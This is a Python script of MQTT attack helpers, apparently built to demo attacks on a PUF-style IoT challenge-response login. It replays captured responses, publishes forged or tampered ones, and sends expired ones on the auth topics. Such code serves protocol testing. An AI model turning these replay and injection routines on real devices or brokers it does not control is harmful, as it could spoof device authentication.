from __future__ import annotations

import argparse
import json
import queue
import secrets
import sys
import threading
import time

import paho.mqtt.client as mqtt

PUBLISH_TIMEOUT_SECONDS = 5.0


def _log(action: str, topic: str, nonce: str) -> None:
    print(f"{action}: topic={topic}, nonce={nonce[:8]}...")


def _publish(client: mqtt.Client, topic: str, payload: dict[str, str], action: str) -> None:
    publish_info = client.publish(topic, json.dumps(payload), qos=1)
    if publish_info is None:
        raise RuntimeError("MQTT publish did not return delivery status")
    if getattr(publish_info, "rc", mqtt.MQTT_ERR_SUCCESS) != mqtt.MQTT_ERR_SUCCESS:
        raise RuntimeError(f"MQTT publish failed with rc={publish_info.rc}")
    try:
        publish_info.wait_for_publish(timeout=PUBLISH_TIMEOUT_SECONDS)
    except (RuntimeError, ValueError) as exc:
        raise RuntimeError(f"MQTT publish confirmation failed: {exc}") from exc
    if not publish_info.is_published():
        raise TimeoutError(
            f"MQTT publish confirmation timed out after {PUBLISH_TIMEOUT_SECONDS:g}s"
        )
    _log(action, topic, payload.get("nonce", ""))


def forge_payload(uid: str, challenge: dict[str, str]) -> dict[str, str]:
    return {
        "uid": uid,
        "nonce": challenge.get("nonce", ""),
        "timestamp": challenge.get("timestamp", ""),
        "hmac": secrets.token_hex(32),
    }


def tamper_payload(response: dict[str, str]) -> dict[str, str]:
    changed = dict(response)
    changed["nonce"] = secrets.token_hex(16)
    return changed


def expired_payload(uid: str, time_window: int) -> dict[str, str]:
    return {
        "uid": uid,
        "nonce": secrets.token_hex(16),
        "timestamp": str(int(time.time()) - time_window - 10),
        "hmac": secrets.token_hex(32),
    }


def run_attack(args: argparse.Namespace) -> None:
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=f"puf-attack-{secrets.token_hex(4)}")
    connected = threading.Event()
    connection_error: list[str] = []
    pending_action: queue.Queue[tuple[str, dict[str, str], str]] = queue.Queue(maxsize=1)

    def on_connect(client, userdata, flags, reason_code, properties):
        if getattr(reason_code, "is_failure", reason_code != 0):
            connection_error.append(f"MQTT connection failed: {reason_code}")
            connected.set()
            return
        connected.set()
        client.subscribe(args.challenge_topic, qos=1)
        client.subscribe(args.response_topic, qos=1)

    def on_message(client, userdata, message):
        try:
            payload = json.loads(message.payload.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            return
        if not isinstance(payload, dict) or payload.get("uid") != args.uid:
            return
        if message.topic == args.response_topic:
            if args.mode == "replay":
                pending_action.put((args.response_topic, payload, "replay"))
            elif args.mode == "tamper":
                pending_action.put(
                    (args.response_topic, tamper_payload(payload), "tamper")
                )
        elif message.topic == args.challenge_topic:
            if args.mode == "forge":
                pending_action.put(
                    (
                        args.response_topic,
                        forge_payload(args.uid, payload),
                        "forge",
                    )
                )
            elif args.mode == "expired":
                # No key is used or required by this attacker.
                pending_action.put(
                    (
                        args.response_topic,
                        expired_payload(args.uid, args.time_window),
                        "expired",
                    )
                )

    client.on_connect = on_connect
    client.on_message = on_message
    try:
        client.connect(args.broker, args.port, keepalive=60)
    except Exception as exc:
        raise RuntimeError(f"MQTT connection failed: {exc}") from exc
    client.loop_start()
    try:
        try:
            topic, payload, action = pending_action.get(timeout=args.timeout)
        except queue.Empty:
            if connection_error:
                raise RuntimeError(connection_error[0])
            if not connected.is_set():
                raise TimeoutError("timed out waiting for MQTT connection")
            raise TimeoutError(f"timed out waiting for {args.mode} attack trigger")
        try:
            _publish(client, topic, payload, action)
        except (RuntimeError, TimeoutError) as exc:
            connection_error.append(str(exc))
        if connection_error:
            raise RuntimeError(connection_error[0])
    finally:
        client.loop_stop()
        client.disconnect()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Unauthenticated MQTT demo attack helpers")
    parser.add_argument("mode", choices=("replay", "forge", "tamper", "expired"))
    parser.add_argument("--broker", default="localhost")
    parser.add_argument("--port", type=int, default=1883)
    parser.add_argument("--uid", required=True)
    parser.add_argument("--timeout", type=float, default=10)
    parser.add_argument("--time-window", type=int, default=60)
    parser.add_argument("--challenge-topic", default="iot/auth/challenge")
    parser.add_argument("--response-topic", default="iot/auth/response")
    return parser.parse_args()


if __name__ == "__main__":
    try:
        run_attack(parse_args())
    except (RuntimeError, TimeoutError) as exc:
        print(f"Attack failed: {exc}", file=sys.stderr)
        sys.exit(1)
